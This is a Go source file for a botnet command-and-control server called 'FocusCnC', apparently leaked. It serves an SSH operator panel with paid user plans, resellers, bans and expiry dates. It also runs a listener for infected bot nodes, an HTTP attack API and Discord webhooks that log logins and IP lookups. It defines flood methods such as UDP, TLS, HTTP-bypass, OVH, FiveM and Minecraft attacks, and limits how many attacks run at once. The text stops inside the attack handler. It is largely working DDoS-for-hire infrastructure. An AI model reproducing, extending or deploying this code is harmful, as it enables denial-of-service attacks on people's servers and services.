// language: Go, file: main.go, target: Linux/Windows Server
// leaked by gurdian bot
package main

import (
	"bufio"
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/rsa"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

const (
	cncBindAddr    = "0.0.0.0"
	nodeBindAddr   = "0.0.0.0"
	apiBindAddr    = "0.0.0.0"
	cncPort        = "420"
	nodePort       = "7002"
	apiPort        = "8443"
	MaxGlobalSlots = 15

	WebhookGlobal = "UR DISCORD WEBHOOK"
	WebhookLogin  = "UR DISCORD WEBHOOK"
	WebhookAttack = "UR DISCORD WEBHOOK"
	WebhookLookup = "UR DISCORD WEBHOOK"
)

type UserAccount struct {
	AccountPlan     string `json:"AccountPlan"`
	Username        string `json:"Username"`
	Password        string `json:"Password"`
	Expiry          string `json:"Expiry"`
	Cooldown        int    `json:"Cooldown"`
	MaxTime         int    `json:"MaxTime"`
	Concurrents     int    `json:"Concurrents"`
	APIAccess       bool   `json:"API Access"`
	VipAccess       bool   `json:"Vip Access"`
	FocusAccess     bool   `json:"Focus Access"`
	HMHAccess       bool   `json:"HMH Access"`
	Admin           bool   `json:"Admin"`
	Reseller        bool   `json:"Reseller"`
	Tools           bool   `json:"Tools"`
	UserAttacksSend int    `json:"User Attacks Send"`
	Banned          bool   `json:"Banned,omitempty"`
	Port            string `json:"Port,omitempty"`
}

func getUserPort(u UserAccount) string {
	if u.Port != "" {
		return u.Port
	}
	return cncPort
}

func generateRandomPort() string {
	var b [2]byte
	rand.Read(b[:])
	val := binary.BigEndian.Uint16(b[:])
	port := 1024 + int(val)%(65535-1024)
	return fmt.Sprintf("%d", port)
}

type botConnection struct {
	conn net.Conn
	arch string
}

type session struct {
	channel ssh.Channel
	term    *term.Terminal
	acct    UserAccount
	remote  string
	port    string
}

type job struct {
	method string
	target string
	port   string
	length time.Duration
	began  time.Time
	user   string
}

var (
	activeJobs      []job
	jobsMutex       sync.Mutex
	nodePtrs        []*botConnection
	botsMutex       sync.Mutex
	sessions        []*session
	sessionsMutex   sync.Mutex
	cncListeners    = make(map[string]net.Listener)
	listenersMutex  sync.Mutex
	globalSSHConfig *ssh.ServerConfig
)

func listenOnPort(port string) bool {
	port = strings.TrimSpace(port)
	if port == "" {
		return false
	}
	listenersMutex.Lock()
	defer listenersMutex.Unlock()

	if _, exists := cncListeners[port]; exists {
		return true
	}

	ln, err := net.Listen("tcp", cncBindAddr+":"+port)
	if err != nil {
		fmt.Printf("[-] Failed to listen on port %s: %v\n", port, err)
		return false
	}
	cncListeners[port] = ln
	fmt.Printf("[+] SSH CNC listening on port %s\n", port)

	go func(l net.Listener, p string) {
		for {
			c, err := l.Accept()
			if err != nil {
				break
			}
			go handleSSHConn(c, globalSSHConfig)
		}
	}(ln, port)

	return true
}

func stopListeningOnPort(port string) {
	listenersMutex.Lock()
	defer listenersMutex.Unlock()
	if ln, exists := cncListeners[port]; exists {
		ln.Close()
		delete(cncListeners, port)
		fmt.Printf("[-] Stopped SSH CNC listener on port %s\n", port)
	}
}

func getOrCreateHostSigner(path string, isRSA bool) (ssh.Signer, error) {
	data, err := os.ReadFile(path)
	if err == nil {
		signer, err := ssh.ParsePrivateKey(data)
		if err == nil {
			return signer, nil
		}
	}

	var pemBlock *pem.Block
	if isRSA {
		key, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return nil, err
		}
		pemBlock, err = ssh.MarshalPrivateKey(key, "")
		if err != nil {
			return nil, err
		}
	} else {
		_, key, err := ed25519.GenerateKey(rand.Reader)
		if err != nil {
			return nil, err
		}
		pemBlock, err = ssh.MarshalPrivateKey(key, "")
		if err != nil {
			return nil, err
		}
	}

	pemBytes := pem.EncodeToMemory(pemBlock)
	_ = os.WriteFile(path, pemBytes, 0600)
	return ssh.ParsePrivateKey(pemBytes)
}

func formatRemainingTime(expiryStr string) string {
	expiryStr = strings.TrimSpace(expiryStr)
	formats := []string{"02:01:2006", "02-01-2006", "2006-01-02", "2006/01/02"}
	var expTime time.Time
	var parsed bool
	for _, layout := range formats {
		if t, err := time.Parse(layout, expiryStr); err == nil {
			expTime = t.Add(23*time.Hour + 59*time.Minute)
			parsed = true
			break
		}
	}
	if !parsed {
		if strings.HasSuffix(expiryStr, "d") {
			var days int
			fmt.Sscanf(expiryStr, "%dd", &days)
			return fmt.Sprintf("%d days, 0 hours", days)
		}
		if strings.HasSuffix(expiryStr, "y") || expiryStr == "999y" {
			return "Lifetime / Years"
		}
		return expiryStr
	}

	diff := time.Until(expTime)
	if diff <= 0 {
		return "Expired"
	}
	totalHours := int(diff.Hours())
	days := totalHours / 24
	hours := totalHours % 24
	return fmt.Sprintf("%d days, %d hours", days, hours)
}

func escapeLen(s string, i int) int {
	if i >= len(s) || s[i] != 0x1b {
		return 0
	}
	if i+1 >= len(s) {
		return 1
	}
	switch s[i+1] {
	case '[':
		j := i + 2
		for j < len(s) {
			c := s[j]
			if c >= 0x40 && c <= 0x7e {
				return j - i + 1
			}
			j++
		}
		return len(s) - i
	case ']':
		j := i + 2
		for j < len(s) {
			if s[j] == 0x07 {
				return j - i + 1
			}
			if s[j] == 0x1b && j+1 < len(s) && s[j+1] == '\\' {
				return j - i + 2
			}
			j++
		}
		return len(s) - i
	default:
		return 2
	}
}

func skipEscapes(s string, i int) int {
	for {
		l := escapeLen(s, i)
		if l == 0 {
			return i
		}
		i += l
	}
}

func matchTag(src string, start int) (name string, end int, isClear bool, ok bool) {
	i := start
	i = skipEscapes(src, i)
	if i >= len(src) || src[i] != '<' {
		return "", 0, false, false
	}
	i++
	i = skipEscapes(src, i)
	if i >= len(src) {
		return "", 0, false, false
	}
	doubleAngle := false
	if src[i] == '<' {
		doubleAngle = true
		i++
		i = skipEscapes(src, i)
	}
	if i >= len(src) || src[i] != '$' {
		return "", 0, false, false
	}
	i++
	var b strings.Builder
	for {
		i = skipEscapes(src, i)
		if i >= len(src) {
			return "", 0, false, false
		}
		c := src[i]
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_' {
			b.WriteByte(c)
			i++
			continue
		}
		break
	}
	if b.Len() == 0 {
		return "", 0, false, false
	}
	i = skipEscapes(src, i)
	if i >= len(src) || src[i] != '>' {
		return "", 0, false, false
	}
	i++
	if doubleAngle {
		i = skipEscapes(src, i)
		if i >= len(src) || src[i] != '>' {
			return "", 0, false, false
		}
		i++
	}
	name = b.String()
	if name == "clear" {
		return "", i, true, true
	}
	return name, i, false, true
}

func renderTfx(w io.Writer, filename string, width, height int, titleStatus string, vars map[string]string) {
	if termObj, ok := w.(*term.Terminal); ok {
		termObj.SetSize(width, height)
	}
	w.Write([]byte(fmt.Sprintf("\x1b]0;%s\x07", titleStatus)))
	w.Write([]byte(fmt.Sprintf("\x1b[8;%d;%dt", height, width)))
	w.Write([]byte("\x1b[3J\x1b[2J\x1b[H"))

	path := filepath.Join("banners", filename)
	data, err := os.ReadFile(path)
	if err == nil {
		src := string(data)
		var out strings.Builder
		i := 0
		n := len(src)

		for i < n {
			if name, end, isClear, ok := matchTag(src, i); ok {
				if isClear {
					if out.Len() > 0 {
						w.Write([]byte(out.String()))
						out.Reset()
					}
					w.Write([]byte("\x1b[3J\x1b[2J\x1b[H"))
					i = end
					continue
				}
				if v, exists := vars[name]; exists {
					out.WriteString(v)
				}
				i = end
				continue
			}
			if l := escapeLen(src, i); l > 0 {
				out.WriteString(src[i : i+l])
				i += l
				continue
			}
			out.WriteByte(src[i])
			i++
		}

		if out.Len() > 0 {
			w.Write([]byte(out.String()))
		}
	} else {
		w.Write([]byte(fmt.Sprintf("Banner %s missing.\r\n", filename)))
	}
}

func main() {
	if _, err := os.Stat("users.json"); os.IsNotExist(err) {
		defaultUsers := []UserAccount{
			{
				AccountPlan: "Owner", Username: "root", Password: "focus_secure_password_123",
				Expiry: "20:03:2030", Cooldown: 0, MaxTime: 9999, Concurrents: 99,
				APIAccess: true, VipAccess: true, FocusAccess: true, HMHAccess: true,
				Admin: true, Reseller: true, Tools: true, UserAttacksSend: 99999,
			},
		}
		raw, _ := json.MarshalIndent(defaultUsers, "", "  ")
		os.WriteFile("users.json", raw, 0644)
	}

	edSigner, err := getOrCreateHostSigner("host_key_ed25519", false)
	if err != nil {
		fmt.Println("failed to load/create ed25519 host key:", err)
		return
	}
	rsaSigner, err := getOrCreateHostSigner("host_key_rsa", true)
	if err != nil {
		fmt.Println("failed to load/create rsa host key:", err)
		return
	}

	sshConfig := &ssh.ServerConfig{
		Config: ssh.Config{
			Ciphers: []string{
				"aes128-gcm@openssh.com", "aes256-gcm@openssh.com", "chacha20-poly1305@openssh.com",
				"aes128-ctr", "aes192-ctr", "aes256-ctr",
				"aes128-cbc", "aes192-cbc", "aes256-cbc", "3des-cbc",
			},
			KeyExchanges: []string{
				"curve25519-sha256", "curve25519-sha256@libssh.org",
				"ecdh-sha2-nistp256", "ecdh-sha2-nistp384", "ecdh-sha2-nistp521",
				"diffie-hellman-group14-sha256", "diffie-hellman-group14-sha1",
				"diffie-hellman-group1-sha1",
			},
			MACs: []string{
				"hmac-sha2-256-etm@openssh.com", "hmac-sha2-512-etm@openssh.com",
				"hmac-sha2-256", "hmac-sha2-512",
				"hmac-sha1", "hmac-sha1-96",
			},
		},
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			user := c.User()
			password := string(pass)
			ok, acct := checkCreds(user, password)
			if !ok {
				fmt.Printf("[-] SSH auth rejected for user %q from %s\n", user, c.RemoteAddr())
				return nil, fmt.Errorf("authentication failed for %q", user)
			}
			fmt.Printf("[+] SSH auth accepted for user %q from %s\n", user, c.RemoteAddr())
			return &ssh.Permissions{
				Extensions: map[string]string{
					"username": acct.Username,
				},
			}, nil
		},
		ServerVersion: "SSH-2.0-FocusCnC",
	}
	sshConfig.AddHostKey(edSigner)
	sshConfig.AddHostKey(rsaSigner)

	globalSSHConfig = sshConfig

	if !listenOnPort(cncPort) {
		fmt.Printf("[-] Failed to bind primary CNC port %s\n", cncPort)
		return
	}

	for _, u := range loadUsers() {
		if u.Port != "" && u.Port != cncPort {
			listenOnPort(u.Port)
		}
	}

	nodeLn, err := net.Listen("tcp", nodeBindAddr+":"+nodePort)
	if err != nil {
		fmt.Println("node listen err:", err)
		return
	}
	defer nodeLn.Close()
	fmt.Printf("[+] Bot Node Server listening on %s:%s\n", nodeBindAddr, nodePort)

	os.MkdirAll("banners", 0755)

	http.HandleFunc("/api/attack", handleAPIRequest)
	go func() {
		fmt.Printf("[+] API HTTP Server started on %s:%s\n", apiBindAddr, apiPort)
		if err := http.ListenAndServe(apiBindAddr+":"+apiPort, nil); err != nil {
			fmt.Println("API HTTP listen err:", err)
		}
	}()

	for {
		c, err := nodeLn.Accept()
		if err != nil {
			continue
		}
		go botSession(c)
	}
}

func handleSSHConn(tcpConn net.Conn, sshConfig *ssh.ServerConfig) {
	remoteAddr := tcpConn.RemoteAddr().String()
	fmt.Printf("[*] New connection from %s\n", remoteAddr)

	sshConn, chans, reqs, err := ssh.NewServerConn(tcpConn, sshConfig)
	if err != nil {
		fmt.Printf("[-] SSH handshake failed from %s: %v\n", remoteAddr, err)
		tcpConn.Close()
		return
	}
	defer sshConn.Close()

	go ssh.DiscardRequests(reqs)

	ok, acct := findUser(sshConn.User())
	if !ok {
		fmt.Printf("[-] User %q not found or banned from %s\n", sshConn.User(), remoteAddr)
		return
	}

	hostPart, portPart, _ := net.SplitHostPort(remoteAddr)
	fmt.Printf("[+] SSH session accepted for user %q (%s)\n", acct.Username, remoteAddr)

	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}
		channel, requests, err := newChannel.Accept()
		if err != nil {
			fmt.Printf("[-] Failed to accept session channel from %s: %v\n", remoteAddr, err)
			continue
		}
		go handleSSHSession(sshConn, channel, requests, acct, hostPart, portPart)
	}
}

func getTitleBar(acct UserAccount) string {
	isAdmin := acct.Admin || strings.EqualFold(acct.AccountPlan, "admin") || strings.EqualFold(acct.AccountPlan, "root") || strings.EqualFold(acct.AccountPlan, "owner")
	if !isAdmin {
		return fmt.Sprintf("Focus | User: %s | Expiry: %s", acct.Username, formatRemainingTime(acct.Expiry))
	}
	bCount := getTotalBots()
	activeGlobalCount := countActiveGlobalJobs()
	return fmt.Sprintf("Focus Botnet | Bots: %d | User: %s | Expiry: %s | Global Slots: %d/%d",
		bCount, acct.Username, formatRemainingTime(acct.Expiry), activeGlobalCount, MaxGlobalSlots)
}

func showWelcomeBackAnimation(t *term.Terminal, username string) {
	t.SetSize(65, 20)
	t.Write([]byte("\x1b[8;20;65t\x1b[3J\x1b[2J\x1b[H\x1b[?25l")) // set 65x20, clear screen & scrollback, hide cursor
	defer t.Write([]byte("\x1b[?25h"))                            // restore cursor

	boxWidth := 48
	leftPad := 8
	topPad := 6
	innerWidth := boxWidth - 2

	var topBorder, botBorder strings.Builder
	topBorder.WriteString(strings.Repeat(" ", leftPad))
	botBorder.WriteString(strings.Repeat(" ", leftPad))

	for i := 0; i < boxWidth; i++ {
		r := 120 + int(float64(135*i)/float64(boxWidth-1))
		g := int(float64(35*i) / float64(boxWidth-1))
		b := 10 + int(float64(35*i)/float64(boxWidth-1))
		color := fmt.Sprintf("\x1b[38;2;%d;%d;%dm", r, g, b)

		if i == 0 {
			topBorder.WriteString(color + "\u256d\x1b[0m")
			botBorder.WriteString(color + "\u2570\x1b[0m")
		} else if i == boxWidth-1 {
			topBorder.WriteString(color + "\u256e\x1b[0m\r\n")
			botBorder.WriteString(color + "\u256f\x1b[0m\r\n")
		} else {
			topBorder.WriteString(color + "\u2500\x1b[0m")
			botBorder.WriteString(color + "\u2500\x1b[0m")
		}
	}

	leftBorder := "\x1b[38;2;120;0;10m\u2502\x1b[0m"
	rightBorder := "\x1b[38;2;255;35;45m\u2502\x1b[0m"
	indent := strings.Repeat(" ", leftPad)
	blankRow := indent + leftBorder + strings.Repeat(" ", innerWidth) + rightBorder + "\r\n"

	var frame strings.Builder
	for i := 0; i < topPad; i++ {
		frame.WriteString("\r\n")
	}
	frame.WriteString(topBorder.String())
	frame.WriteString(blankRow)
	frame.WriteString(blankRow)
	frame.WriteString(blankRow)
	frame.WriteString(botBorder.String())

	t.Write([]byte(frame.String()))

	text := fmt.Sprintf("Welcome Back %s", username)
	textRow := topPad + 3
	startCol := leftPad + 1 + (innerWidth-len(text))/2 + 1

	t.Write([]byte(fmt.Sprintf("\x1b[%d;%dH", textRow, startCol)))

	startTime := time.Now()
	for _, ch := range text {
		t.Write([]byte(fmt.Sprintf("\x1b[1;38;5;255m%c\x1b[0m", ch)))
		time.Sleep(75 * time.Millisecond)
	}

	elapsed := time.Since(startTime)
	if rem := (5 * time.Second) - elapsed; rem > 0 {
		time.Sleep(rem)
	}
}

func handleSSHSession(sshConn *ssh.ServerConn, channel ssh.Channel, requests <-chan *ssh.Request, acct UserAccount, hostPart, portPart string) {
	defer sshConn.Close()
	defer channel.Close()

	t := term.NewTerminal(channel, "")

	s := &session{channel: channel, term: t, acct: acct, remote: hostPart, port: portPart}
	sessionsMutex.Lock()
	sessions = append(sessions, s)
	sessionsMutex.Unlock()

	defer func() {
		sessionsMutex.Lock()
		var newSessions []*session
		for _, sess := range sessions {
			if sess != s {
				newSessions = append(newSessions, sess)
			}
		}
		sessions = newSessions
		sessionsMutex.Unlock()
	}()

	go func(in <-chan *ssh.Request) {
		for req := range in {
			switch req.Type {
			case "pty-req":
				if len(req.Payload) >= 8 {
					termLen := binary.BigEndian.Uint32(req.Payload[0:4])
					if len(req.Payload) >= int(4+termLen+8) {
						w := binary.BigEndian.Uint32(req.Payload[4+termLen : 8+termLen])
						h := binary.BigEndian.Uint32(req.Payload[8+termLen : 12+termLen])
						t.SetSize(int(w), int(h))
					}
				}
				req.Reply(true, nil)
			case "window-change":
				if len(req.Payload) >= 8 {
					w := binary.BigEndian.Uint32(req.Payload[0:4])
					h := binary.BigEndian.Uint32(req.Payload[4:8])
					t.SetSize(int(w), int(h))
				}
				req.Reply(true, nil)
			case "shell":
				req.Reply(true, nil)
			case "env":
				req.Reply(true, nil)
			default:
				req.Reply(false, nil)
			}
		}
	}(requests)

	nowStr := time.Now().UTC().Format("2006-01-02 15:04:05 UTC")
	loginFields := map[string]string{
		"User":       acct.Username,
		"VIP Rank":   acct.AccountPlan,
		"Remote IP":  hostPart,
		"SSH Port":   portPart,
		"Max Time":   fmt.Sprintf("%ds", acct.MaxTime),
		"Expiry":     formatRemainingTime(acct.Expiry),
		"Time (UTC)": nowStr,
	}
	go sendDiscordEmbedWebhook(WebhookLogin, "FocusCnC - User Authentication", 3447003, loginFields)
	go sendDiscordEmbedWebhook(WebhookGlobal, "FocusCnC - Global Login Event", 3447003, loginFields)

	t.Write([]byte("\x1b[3J\x1b[2J\x1b[H"))
	renderTfx(t, "welcome.tfx", 80, 24, "FocusCnC - Welcome", map[string]string{})
	time.Sleep(1 * time.Second)

	showWelcomeBackAnimation(t, acct.Username)

	titleBar := getTitleBar(acct)

	renderTfx(t, "main.tfx", 65, 20, titleBar, map[string]string{})

	for {
		if ok, latest := findUser(acct.Username); ok {
			acct = latest
		} else {
			t.Write([]byte("\r\n[-] Account disabled or removed.\r\n"))
			return
		}

		titleBar = getTitleBar(acct)
		t.Write([]byte(fmt.Sprintf("\x1b]0;%s\x07", titleBar)))

		// Prompt: clean white-to-red left-to-right gradient across all characters, cross (†), no #
		// FIX: write ANSI prompt manually, then ReadLine with "" prompt
		// so golang.org/x/term cursor math starts at col 0 (no ANSI confusion).
		username := acct.Username
		fullText := " " + username + " • FocusCnC † "
		runes := []rune(fullText)
		totalChars := len(runes)
		ansiPrompt := ""
		for i, ch := range runes {
			if ch == ' ' {
				ansiPrompt += " "
				continue
			}
			t2 := float64(i) / float64(max(totalChars-1, 1))
			r2 := int(255 - 25*t2)  // 255 -> 230
			g2 := int(255 - 235*t2) // 255 -> 20
			b2 := int(255 - 235*t2) // 255 -> 20
			ansiPrompt += fmt.Sprintf("\x1b[1m\x1b[38;2;%d;%d;%dm%c\x1b[0m", r2, g2, b2, ch)
		}
		t.SetPrompt("")
		t.Write([]byte(ansiPrompt))

		input, err := t.ReadLine()
		if err != nil {
			break
		}
		parts := strings.Fields(input)
		if len(parts) == 0 {
			continue
		}

		cmd := strings.ToLower(parts[0])

		switch cmd {
		case "clear", "cls":
			renderTfx(t, "main.tfx", 65, 20, titleBar, map[string]string{})

		case "help":
			renderTfx(t, "help.tfx", 91, 16, titleBar, map[string]string{})

		case "admin", "!admin":
			isAdmin := acct.Admin || strings.EqualFold(acct.AccountPlan, "admin") || strings.EqualFold(acct.AccountPlan, "root") || strings.EqualFold(acct.AccountPlan, "owner")
			if !isAdmin {
				t.Write([]byte("\x1b[38;5;196m[-] Permission denied. Admin rank required.\x1b[0m\r\n"))
				continue
			}
			renderTfx(t, "admin.tfx", 91, 18, titleBar, map[string]string{})

		case "methods":
			renderTfx(t, "methods.tfx", 85, 34, titleBar, map[string]string{})

		case "account":
			remTimeStr := formatRemainingTime(acct.Expiry)
			replacements := map[string]string{
				"plan":           acct.AccountPlan,
				"username":       acct.Username,
				"expiry":         remTimeStr,
				"cooldown":       fmt.Sprintf("%ds", acct.Cooldown),
				"max_time":       fmt.Sprintf("%ds", acct.MaxTime),
				"concurrents":    fmt.Sprintf("%d", acct.Concurrents),
				"api_acces":      fmt.Sprintf("%t", acct.APIAccess),
				"vip_access":     fmt.Sprintf("%t", acct.VipAccess),
				"focus_access":   fmt.Sprintf("%t", acct.FocusAccess),
				"hmh_access":     fmt.Sprintf("%t", acct.HMHAccess),
				"admin":          fmt.Sprintf("%t", acct.Admin),
				"reseller":       fmt.Sprintf("%t", acct.Reseller),
				"tools_access":   fmt.Sprintf("%t", acct.Tools),
				"attack_of_user": fmt.Sprintf("%d", acct.UserAttacksSend),
				"port":           getUserPort(acct),
				"p":              acct.AccountPlan, "l": acct.AccountPlan, "a": acct.AccountPlan, "n": acct.AccountPlan,
				"u": acct.Username, "s": acct.Username, "e": acct.Username, "r": acct.Username, "m": acct.Username,
			}
			renderTfx(t, "plan_info.tfx", 77, 20, titleBar, replacements)

		case "configs":
			t.Write([]byte("[*] Configure The Themes For Your C2 Session: loaded default theme.\r\n"))

		case "ongoing":
			jobsMutex.Lock()
			found := false
			for _, j := range activeJobs {
				if j.user == acct.Username {
					rem := time.Until(j.began.Add(j.length))
					if rem > 0 {
						t.Write([]byte(fmt.Sprintf("[Ongoing] Method: %s | Target: %s:%s | Remaining: %ds\r\n", j.method, j.target, j.port, int(rem.Seconds()))))
						found = true
					}
				}
			}
			jobsMutex.Unlock()
			if !found {
				t.Write([]byte("No ongoing attacks found.\r\n"))
			}

		case "bots":
			breakdown := getBotArchitectureBreakdown()
			var sb strings.Builder
			for arch, count := range breakdown {
				sb.WriteString(fmt.Sprintf("%s [%d]\r\n", arch, count))
			}
			t.Write([]byte(sb.String()))

		case "!listusers", "listusers", "users":
			isAdmin := acct.Admin || strings.EqualFold(acct.AccountPlan, "admin") || strings.EqualFold(acct.AccountPlan, "root") || strings.EqualFold(acct.AccountPlan, "owner")
			if !isAdmin {
				t.Write([]byte("Permission denied.\r\n"))
				continue
			}
			for _, u := range loadUsers() {
				t.Write([]byte(fmt.Sprintf("User: %s | Plan: %s | Expiry: %s | Port: %s | Admin: %t | Banned: %t\r\n", u.Username, u.AccountPlan, formatRemainingTime(u.Expiry), getUserPort(u), u.Admin, u.Banned)))
			}

		case "!adduser", "adduser":
			isAdmin := acct.Admin || strings.EqualFold(acct.AccountPlan, "admin") || strings.EqualFold(acct.AccountPlan, "root") || strings.EqualFold(acct.AccountPlan, "owner")
			if !isAdmin || len(parts) < 3 {
				t.Write([]byte("Usage: adduser <username> <password> [expiry_DD:MM:YYYY]\r\n"))
				continue
			}
			expDate := "20:03:2030"
			if len(parts) >= 4 {
				expDate = parts[3]
			}
			assignedPort := generateRandomPort()
			for attempts := 0; attempts < 15; attempts++ {
				if listenOnPort(assignedPort) {
					break
				}
				assignedPort = generateRandomPort()
			}
			users := loadUsers()
			users = append(users, UserAccount{
				Username: parts[1], Password: parts[2], AccountPlan: "Default", Expiry: expDate,
				MaxTime: 60, Concurrents: 5, UserAttacksSend: 50,
				Port: assignedPort,
			})
			saveUsers(users)
			t.Write([]byte(fmt.Sprintf("User added successfully. Assigned Port: %s\r\n", assignedPort)))

		case "!deluser", "deluser":
			isAdmin := acct.Admin || strings.EqualFold(acct.AccountPlan, "admin") || strings.EqualFold(acct.AccountPlan, "root") || strings.EqualFold(acct.AccountPlan, "owner")
			if !isAdmin || len(parts) < 2 {
				t.Write([]byte("Usage: deluser <username>\r\n"))
				continue
			}
			users := loadUsers()
			var nUsers []UserAccount
			var deletedPort string
			for _, u := range users {
				if u.Username != parts[1] {
					nUsers = append(nUsers, u)
				} else {
					deletedPort = u.Port
				}
			}
			saveUsers(nUsers)
			if deletedPort != "" && deletedPort != cncPort {
				stillUsed := false
				for _, u := range nUsers {
					if u.Port == deletedPort {
						stillUsed = true
						break
					}
				}
				if !stillUsed {
					stopListeningOnPort(deletedPort)
				}
			}
			t.Write([]byte("User deleted.\r\n"))

		case "!banuser", "banuser":
			isAdmin := acct.Admin || strings.EqualFold(acct.AccountPlan, "admin") || strings.EqualFold(acct.AccountPlan, "root") || strings.EqualFold(acct.AccountPlan, "owner")
			if !isAdmin || len(parts) < 2 {
				t.Write([]byte("Usage: banuser <username>\r\n"))
				continue
			}
			users := loadUsers()
			for i, u := range users {
				if u.Username == parts[1] {
					users[i].Banned = true
				}
			}
			saveUsers(users)
			t.Write([]byte("User banned.\r\n"))

		case "!unbanuser", "unbanuser":
			isAdmin := acct.Admin || strings.EqualFold(acct.AccountPlan, "admin") || strings.EqualFold(acct.AccountPlan, "root") || strings.EqualFold(acct.AccountPlan, "owner")
			if !isAdmin || len(parts) < 2 {
				t.Write([]byte("Usage: unbanuser <username>\r\n"))
				continue
			}
			users := loadUsers()
			found := false
			for i, u := range users {
				if u.Username == parts[1] {
					users[i].Banned = false
					found = true
				}
			}
			if !found {
				t.Write([]byte("\x1b[38;5;196m[-] User not found.\x1b[0m\r\n"))
				continue
			}
			saveUsers(users)
			t.Write([]byte("\x1b[38;5;118m[+] User unbanned successfully.\x1b[0m\r\n"))

		case "!setrank", "setrank":
			isAdmin := acct.Admin || strings.EqualFold(acct.AccountPlan, "admin") || strings.EqualFold(acct.AccountPlan, "root") || strings.EqualFold(acct.AccountPlan, "owner")
			if !isAdmin || len(parts) < 3 {
				t.Write([]byte("Usage: setrank <username> <rank>\r\n"))
				continue
			}
			users := loadUsers()
			found := false
			for i, u := range users {
				if u.Username == parts[1] {
					users[i].AccountPlan = parts[2]
					found = true
				}
			}
			if !found {
				t.Write([]byte("\x1b[38;5;196m[-] User not found.\x1b[0m\r\n"))
				continue
			}
			saveUsers(users)
			t.Write([]byte(fmt.Sprintf("\x1b[38;5;118m[+] Rank updated: %s => %s\x1b[0m\r\n", parts[1], parts[2])))

		case "!setadmin", "setadmin":
			isAdmin := acct.Admin || strings.EqualFold(acct.AccountPlan, "admin") || strings.EqualFold(acct.AccountPlan, "root") || strings.EqualFold(acct.AccountPlan, "owner")
			if !isAdmin || len(parts) < 3 {
				t.Write([]byte("Usage: setadmin <username> <true|false>\r\n"))
				continue
			}
			val := strings.ToLower(parts[2]) == "true"
			users := loadUsers()
			found := false
			for i, u := range users {
				if u.Username == parts[1] {
					users[i].Admin = val
					found = true
				}
			}
			if !found {
				t.Write([]byte("\x1b[38;5;196m[-] User not found.\x1b[0m\r\n"))
				continue
			}
			saveUsers(users)
			t.Write([]byte(fmt.Sprintf("\x1b[38;5;118m[+] Admin status for %s set to %t\x1b[0m\r\n", parts[1], val)))

		case "!userinfo", "userinfo":
			isAdmin := acct.Admin || strings.EqualFold(acct.AccountPlan, "admin") || strings.EqualFold(acct.AccountPlan, "root") || strings.EqualFold(acct.AccountPlan, "owner")
			if !isAdmin || len(parts) < 2 {
				t.Write([]byte("Usage: userinfo <username>\r\n"))
				continue
			}
			ok, u := findUser(parts[1])
			if !ok {
				t.Write([]byte("\x1b[38;5;196m[-] User not found or banned.\x1b[0m\r\n"))
				continue
			}
			t.Write([]byte(fmt.Sprintf(
				"\x1b[38;5;208m[UserInfo] %s\x1b[0m\r\n"+
					"  Plan        : %s\r\n"+
					"  Expiry      : %s\r\n"+
					"  Port        : %s\r\n"+
					"  MaxTime     : %ds\r\n"+
					"  Cooldown    : %ds\r\n"+
					"  Concurrents : %d\r\n"+
					"  Admin       : %t\r\n"+
					"  Reseller    : %t\r\n"+
					"  API Access  : %t\r\n"+
					"  VIP Access  : %t\r\n"+
					"  Focus Access: %t\r\n"+
					"  HMH Access  : %t\r\n"+
					"  Tools       : %t\r\n"+
					"  AttacksSent : %d\r\n"+
					"  Banned      : %t\r\n",
				u.Username, u.AccountPlan, formatRemainingTime(u.Expiry), getUserPort(u),
				u.MaxTime, u.Cooldown, u.Concurrents,
				u.Admin, u.Reseller, u.APIAccess, u.VipAccess,
				u.FocusAccess, u.HMHAccess, u.Tools,
				u.UserAttacksSend, u.Banned,
			)))

		case "lookup":
			if len(parts) < 2 {
				t.Write([]byte("Usage: lookup <ip>\r\n"))
				continue
			}
			targetIP := parts[1]
			replacements := map[string]string{
				"ip":          targetIP,
				"city":        "Local City",
				"region":      "Local Region",
				"country":     "Local Country",
				"loc":         "0.0000,0.0000",
				"org":         "Local ISP / Hosting",
				"postal":      "00000",
				"timezone":    "UTC",
				"continent":   "Global",
				"latitude":    "0.0000",
				"longitude":   "0.0000",
				"ISP":         "Local ISP",
				"google_maps": fmt.Sprintf("https://maps.google.com/?q=%s", targetIP),
			}
			renderTfx(t, "lookup.tfx", 67, 24, titleBar, replacements)

			lookupFields := map[string]string{
				"Target Query": targetIP,
				"ISP Profile":  "Cloudflare / Local ISP",
				"VPN / Proxy":  "No",
			}
			go sendDiscordEmbedWebhook(WebhookLookup, "FocusCnC - IP Intelligence Lookup", 15158332, lookupFields)

		case "lookupv":
			if len(parts) < 2 {
				t.Write([]byte("Usage: lookupv <ip>\r\n"))
				continue
			}
			targetIP := parts[1]
			replacements := map[string]string{
				"ip":          targetIP,
				"city":        "Advanced Verbose City",
				"region":      "Advanced Region",
				"country":     "Advanced Country",
				"loc":         "0.0000,0.0000",
				"org":         "Cloudflare, Inc.",
				"postal":      "00000",
				"timezone":    "UTC",
				"continent":   "Global",
				"latitude":    "0.0000",
				"longitude":   "0.0000",
				"ISP":         "AS13335 Cloudflare, Inc.",
				"google_maps": fmt.Sprintf("https://maps.google.com/?q=%s", targetIP),
			}
			renderTfx(t, "lookup.tfx", 67, 24, titleBar, replacements)

			lookupFields := map[string]string{
				"Target Query": targetIP,
				"BGP AS":       "AS13335 Cloudflare, Inc.",
				"Threat Score": "Clean",
			}
			go sendDiscordEmbedWebhook(WebhookLookup, "FocusCnC - Advanced IP Intelligence Lookup", 15158332, lookupFields)

		case "!tls", "!http", "!browser", "!httpbypass", "!udp-gbps", "!udpbypass", "!discord", "!tcp", "!syn", "!game", "!ovh-flood", "!fivem", "!minecraft", "!http-focus", "!udp-focus", "!tcp-focus", "!pps-focus", "!home-holder", "!kill-all":
			if len(parts) < 3 {
				t.Write([]byte("Usage: method <target> <port> [duration]\r\n"))
				continue
			}

			if countActiveGlobalJobs() >= MaxGlobalSlots {
				t.Write([]byte("[-] Global attack slots are currently full (15/15). Please wait.\r\n"))
				continue
			}

